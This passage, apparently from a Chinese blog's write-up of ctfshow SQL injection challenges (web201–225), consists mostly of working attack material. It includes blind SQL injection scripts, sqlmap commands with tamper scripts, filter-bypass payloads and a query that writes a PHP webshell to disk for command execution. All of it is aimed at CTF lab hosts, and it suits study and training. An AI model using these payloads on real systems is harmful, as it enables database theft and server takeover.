&#x27;1&#x27;, &#x27;ip&#x27;: f&quot;if((select table_name from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27; limit 0, 1) like &#x27;&#123;out+k&#125;%&#x27;,(select count(*) from information_schema.columns A, information_schema.columns B),0)&quot;&#125;  # 猜表名<br>        # payload = &#123;&#x27;debug&#x27;: &#x27;1&#x27;,&#x27;ip&#x27;: f&quot;if((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;) like &#x27;&#123;out+k&#125;%&#x27;,(select count(*) from information_schema.columns A, information_schema.columns B),0)&quot;&#125;  # 猜表名<br>        # payload = &#123;&#x27;debug&#x27;: &#x27;1&#x27;,&#x27;ip&#x27;: f&quot;if((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;ctfshow_web&#x27; and table_name=&#x27;ctfshow_flagxcac&#x27;) like &#x27;&#123;out+k&#125;%&#x27;,(select count(*) from information_schema.columns A, information_schema.columns B),0)&quot;&#125;  # 猜列名<br>        # payload = &#123;&#x27;debug&#x27;: &#x27;1&#x27;,&#x27;ip&#x27;: f&quot;if((select column_name from information_schema.columns where table_schema=&#x27;ctfshow_web&#x27; and table_name=&#x27;ctfshow_flagxcac&#x27; limit 1, 1) like &#x27;&#123;out + k&#125;%&#x27;,(select count(*) from information_schema.columns A, information_schema.columns B),0)&quot;&#125;  # 猜列名<br>        payload = &#123;&#x27;debug&#x27;: &#x27;1&#x27;,<br>                   &#x27;ip&#x27;: f&quot;if((select flagaabcc from ctfshow_flagxcac) like &#x27;&#123;out + k&#125;%&#x27;,(select count(*) from information_schema.columns A, information_schema.columns B),0)&quot;&#125;  # 跑flag<br>        re = requests.post(url, data=payload)<br>        if re.elapsed.total_seconds() &gt; 0.3:<br>            out += k<br>            break<br>    print(out)<br></code></pre></td></tr></table></figure>
+
+<h3 id="web221"><a href="#web221" class="headerlink" title="web221"></a>web221</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">limit注入 LIMIT<br>网上直接能找到板子<br>http://xxxx/xxxx.php?id=1 procedure analyse(extractvalue(rand(),concat(0x3a,(注入语句 LIMIT 0,1))),1)%23<br>直接提交数据库就行了<br>/api/?page=1&amp;limit=1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1)#<br></code></pre></td></tr></table></figure>
+
+<h3 id="web222（group-by"><a href="#web222（group-by" class="headerlink" title="web222（group by"></a>web222（group by</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs text">import requests<br>import time<br>url = &#x27;http://a8a8c7a5-de31-4ef4-89fd-e29eec574fc8.challenge.ctf.show/api/?u=&#x27;<br>url2 = &#x27; &amp;page=1&amp;limit=10&#x27;<br>str = &#x27;&#x27;<br>for i in range(60):<br>    min,max = 32, 128<br>    while True:<br>        j = min + (max-min)//2<br>        if(min == j):<br>            str += chr(j)<br>            print(str)<br>            break<br>        # 爆表名<br>        # payload = f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.05),&#x27;False&#x27;)&quot;<br>        # 爆列<br>        # payload = f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flaga&#x27;),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.05),&#x27;False&#x27;)&quot;<br>        # 爆值<br>        payload = f&quot;if(ascii(substr((select group_concat(flagaabc) from ctfshow_flaga),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.05),&#x27;False&#x27;)&quot;<br>        url0 = url + payload + url2<br>        start_time = time.time()<br>        r = requests.get(url=url0).text<br>        end_time = time.time()<br>        sub = end_time - start_time<br>        if sub &gt;= 1:<br>            max = j<br>        else:<br>            min = j<br></code></pre></td></tr></table></figure>
+
+<h3 id="web223（group-by无数字"><a href="#web223（group-by无数字" class="headerlink" title="web223（group by无数字"></a>web223（group by无数字</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">增加了数字的过滤<br>可以利用ture=1来绕过，比如我们想构造一个字符 1 ，则会被转换为：<br>concat(char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true))<br>也就是 char(49)<br>加号要编码一下，因为这里是 get 传参并且进行了 URL 解码，如果拼接方式是加号会导致服务器错误的解析为空格，从而无法识别，没有回显，需要对加号进行 URL 编码再传入，即 %2b 。<br><br>或者利用ascii单独对数字就行处理<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs text">   #1<br>import requests<br>import string<br> <br>def convert(value):<br>    t = &#x27;concat(&#x27;<br>    # 处理数字<br>    if isinstance(value, int):<br>        t += &#x27;char(true&#x27; + &#x27;%2btrue&#x27; * (value - 1) + &#x27;),&#x27;<br>    # 处理字符<br>    elif isinstance(value, str):<br>        for s in value:<br>            t += &#x27;char(true&#x27; + &#x27;%2btrue&#x27; * (ord(s) - 1) + &#x27;),&#x27;<br>    return t[:-1] + &quot;)&quot;<br># 测试转换数字1<br># print(convert(1))<br># 测试转换字符串 &#x27;1&#x27;<br># print(convert(&#x27;1&#x27;))<br> <br>url = &#x27;http://1742166c-83ef-461b-88f9-348a8dfafb75.challenge.ctf.show/api/index.php&#x27;<br>dic = string.digits+string.ascii_lowercase+&#x27;&#123;&#125;-_&#x27;<br>out = &#x27;&#x27;<br> <br>for j in range(1,50):<br>    a = convert(f&#x27;&#123;j&#125;&#x27;)<br>    for k in dic:<br>        b = convert(f&#x27;&#123;k&#125;&#x27;)<br>        # payload = (f&quot;u=if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;a&#125;,true)=&#123;b&#125;,username,&#x27;a&#x27;)&quot;)  # 跑表名<br>        # print(payload)<br>        # payload = f&quot;u=if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;ctfshow_flagas&#x27;),&#123;a&#125;,true)=&#123;b&#125;,username,&#x27;a&#x27;)&quot;  # 跑列名<br>        payload = f&quot;u=if(substr((select flagasabc from ctfshow_flagas),&#123;a&#125;,true)=&#123;b&#125;,username,&#x27;a&#x27;)&quot;  # 布尔盲注跑flag<br>        # payload = f&quot;u=if(substr((select flagaabc from ctfshow_flaga),&#123;j&#125;,1)=&#x27;&#123;k&#125;&#x27;,sleep(0.1),0)&quot;  # 时间盲注跑flag<br>        re = requests.get(url, params=payload)<br>        if &quot;passwordAUTO&quot; in re.text:<br>        # if re.elapsed.total_seconds() &gt; 2:<br>            out += k<br>            break<br>    print(out)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs text">#2  <br>import requests<br>import string<br> <br>def convert(v):<br>    v = str(v)<br>    return &quot;concat(&quot; + &quot;,&quot;.join([f&quot;ascii(&#x27;%0&#123;c&#125;&#x27;)&quot; for c in v]) + &quot;)&quot;<br> <br> <br>url = &#x27;http://1742166c-83ef-461b-88f9-348a8dfafb75.challenge.ctf.show/api/index.php&#x27;<br>dic = string.digits+string.ascii_lowercase+&#x27;&#123;&#125;-_&#x27;<br>out = &#x27;&#x27;<br> <br>for j in range(1,50):<br>    a = convert(f&#x27;&#123;j&#125;&#x27;)<br>    # print(a)<br>    for k in dic:<br>        if k in &#x27;0123456789&#x27;:<br>            b = convert(f&#x27;&#123;k&#125;&#x27;)<br>            payload = f&quot;u=if(substr((select flagasabc from ctfshow_flagas),&#123;a&#125;,true)=&#123;b&#125;,username,&#x27;a&#x27;)&quot;  # 数字字符会转成concat形式，默认就是字符，不需要引号包裹<br>        else:<br>            b = f&#x27;&#123;k&#125;&#x27;<br>            payload = f&quot;u=if(substr((select flagasabc from ctfshow_flagas),&#123;a&#125;,true)=&#x27;&#123;b&#125;&#x27;,username,&#x27;a&#x27;)&quot;  # 非数字字符需要使用引号包裹才会被认为是字符串<br>        # print(b)<br>        # payload = (f&quot;u=if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;a&#125;,true)=&#x27;&#123;b&#125;&#x27;,username,&#x27;a&#x27;)&quot;)  # 跑表名<br>        # print(payload)<br>        # payload = f&quot;u=if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;ctfshow_flagas&#x27;),&#123;a&#125;,true)=&#x27;&#123;b&#125;&#x27;,username,&#x27;a&#x27;)&quot;  # 跑列名<br>        re = requests.get(url, params=payload)<br>        if &quot;passwordAUTO&quot; in re.text:<br>            out += k<br>            break<br>    print(out)<br></code></pre></td></tr></table></figure>
+
+<h3 id="web224（文件注入"><a href="#web224（文件注入" class="headerlink" title="web224（文件注入"></a>web224（文件注入</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">登录找注入点发现啥也没有，扫一下发现了robots.txt,有个路由进去能改密码<br>然后是一个文件上传页面<br>然后不会了<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">构造一个特殊的txt文本上传，将下面的内容写到txt文件中，上传文件。 0x3c3f3d60245f4745545b315d603f3e 是一句话 的16进制形式。&lt;?=`$_GET[1]`?&gt;<br>C64File &quot;&#x27;);select 0x3c3f3d60245f4745545b315d603f3e into outfile &#x27;/var/www/html/1.php&#x27;;--+<br>群里也有payload.bin<br>然后就能rce了<br></code></pre></td></tr></table></figure>
+
+<h3 id="web225（HANDLER命令"><a href="#web225（HANDLER命令" class="headerlink" title="web225（HANDLER命令"></a>web225（HANDLER命令</h3><p>前三部分用show拿信息</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">username=&#x27;;show%20databases;<br>username=&#x27;;show%20tables%20from%20ctfshow_web; <br>username=&#x27;;show%20columns%20from%20ctfshow_web.ctfshow_flagasa; <br></code></pre></td></tr></table></figure>
+
+<p>禁用了select，我们用handler来读取</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">username=&#x27;;handler%20ctfshow_flagasa%20open;handler%20ctfshow_flagasa%20read%20first;HANDLER%20ctfshow_flagasa%20CLOSE;<br></code></pre></td></tr></table></figure>
+
+<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><h3 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs text">sqlmap -u http://75d6ef49-ed52-4bc1-bb21-5320fc6d1485.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show<br>爆数据库<br><br>sqlmap -u http://75d6ef49-ed52-4bc1-bb21-5320fc6d1485.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show --dbs<br>爆表<br><br>sqlmap -u http://75d6ef49-ed52-4bc1-bb21-5320fc6d1485.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D <br>ctfshow_web --tables <br>爆列<br><br>sqlmap -u http://75d6ef49-ed52-4bc1-bb21-5320fc6d1485.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D <br>ctfshow_web -T ctfshow_user --columns<br>爆值<br><br>sqlmap -u http://75d6ef49-ed52-4bc1-bb21-5320fc6d1485.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D <br>ctfshow_web -T ctfshow_user --dump <br></code></pre></td></tr></table></figure>
+
+<h3 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h3><p>改请求方式</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">sqlmap -u http://3702c6fc-0dca-4e2b-aa95-dc334b33eebd.challenge.ctf.show/api/ --data &#x27;id=1&#x27; --user-agent sqlmap --referer ctf.show -D ctfshow_web -T ctfshow_user --dump <br></code></pre></td></tr></table></figure>
+
+<h3 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">sqlmap -u &quot;http://00ab91ca-936c-4f20-a55c-fc72fd22c9d3.challenge.ctf.show/api/index.php&quot; --method=&quot;PUT&quot; --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; -D ctfshow_web -T ctfshow_user -C pass --dump <br><br>需要加上--headers=&quot;Content-Type: text/plain&quot;，否则是按表单提交的<br></code></pre></td></tr></table></figure>
+
+<h3 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h3><p>加上cookie</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">sqlmap -u &quot;http://6048258b-d15b-4527-aff1-1e1cd9c1fad8.challenge.ctf.show/api/index.php&quot; --method=&quot;PUT&quot; --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --cookie=&quot;ctfshow=5c1aef87df7951580e410b7bff716ed5;PHPSESSID=3ajnn0doc03pm1rfpau7q01iaq&quot; -D ctfshow_web -T ctfshow_user -C pass --dump<br></code></pre></td></tr></table></figure>
+
+<h3 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h3><p>注意换表了</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">sqlmap -u &quot;http://633836b2-516f-439f-8b39-ec69dcb72462.challenge.ctf.show/api/index.php&quot;  --method=&quot;PUT&quot; --data=&quot;id=1&quot; --referer=ctf.show --safe-url=&quot;http://633836b2-516f-439f-8b39-ec69dcb72462.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --headers=&quot;Content-Type: text/plain&quot; --cookie=&quot;PHPSESSID=t8tv3cv6grjbj2iivg5qavif8h;&quot; -D ctfshow_web -T ctfshow_flax --dump<br></code></pre></td></tr></table></figure>
+
+<h3 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">sqlmap -u &quot;http://95532399-e482-42f4-8f02-f9dd7da05b71.challenge.ctf.show/api/index.php&quot;  --method=&quot;PUT&quot; --data=&quot;id=1&quot; --referer=ctf.show --safe-url=&quot;http://95532399-e482-42f4-8f02-f9dd7da05b71.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --headers=&quot;Content-Type: text/plain&quot; --cookie=&quot;PHPSESSID=64giq9ecahg4udnj8d3jlsnq29;&quot; --prefix=&quot;&#x27;)&quot; --suffix=&quot;#&quot; -D ctfshow_web -T ctfshow_flaxc --dump<br></code></pre></td></tr></table></figure>
+
+<h3 id="web207"><a href="#web207" class="headerlink" title="web207"></a>web207</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">sqlmap -u &quot;http://ba6881d8-4d9b-4558-8cf0-cedef0f7c302.challenge.ctf.show/api/index.php&quot;  --method=&quot;PUT&quot; --data=&quot;id=1&quot; --referer=ctf.show --safe-url=&quot;http://ba6881d8-4d9b-4558-8cf0-cedef0f7c302.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --headers=&quot;Content-Type: text/plain&quot; --cookie=&quot;PHPSESSID=ijtgruf6btc269f58j12jr3seo;&quot; --prefix=&quot;&#x27;)&quot; --suffix=&quot;#&quot; --tamper=space2comment -D ctfshow_web -T ctfshow_flaxca --dump<br></code></pre></td></tr></table></figure>
+
+<h3 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h3><p>过滤了select和空格</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">sqlmap -u &quot;http://ecaa8898-d8e6-4a96-bdcf-9ca3b17ad812.challenge.ctf.show/api/index.php&quot;  --method=&quot;PUT&quot; --data=&quot;id=1&quot; --referer=ctf.show --safe-url=&quot;http://ecaa8898-d8e6-4a96-bdcf-9ca3b17ad812.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --headers=&quot;Content-Type: text/plain&quot; --cookie=&quot;PHPSESSID=3mmbm7crft5lt3gh2ioso2pl3c;&quot; --prefix=&quot;&#x27;)&quot; --suffix=&quot;#&quot; --tamper=space2comment,uppercase.py -D ctfshow_web -T ctfshow_flaxcac --dump<br>可以使用内置脚本uppercase.py绕过<br></code></pre></td></tr></table></figure>
+
+<p>也可以选择直接写双写绕过替换</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs text">#!/usr/bin/env python    RichardChai53佬的脚本，就是直接替换<br><br>from lib.core.compat import xrange<br>from lib.core.enums import PRIORITY<br><br>__priority__ = PRIORITY.LOW<br><br>def dependencies():<br>    pass<br><br>def tamper(payload, **kwargs):<br>    retVal = payload<br>    if payload:<br>        retVal = retVal.replace(&quot;SELECT&quot;, &quot;seselectlect&quot;)<br>    return retVal<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF%E9%A2%98%E8%A7%A3/" class="category-chain-item">CTF题解</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF%E9%A2%98%E8%A7%A3/ctfshow/" class="category-chain-item">ctfshow</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctfshow/" class="print-no-link">#ctfshow</a>
+      
+        <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" class="print-no-link">#SQL注入</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ctfshow SQL 注入题解</div>
+      <div>https://xendr1a.github.io/2025/08/05/ctfshow-sql/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Xendr1a</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年8月5日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/08/20/ctfshow-deser/" title="ctfshow 反序列化题解">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">ctfshow 反序列化题解</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/07/15/ctfshow-php/" title="ctfshow PHP 特性题解">
+                        <span class="hidden-mobile">ctfshow PHP 特性题解</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
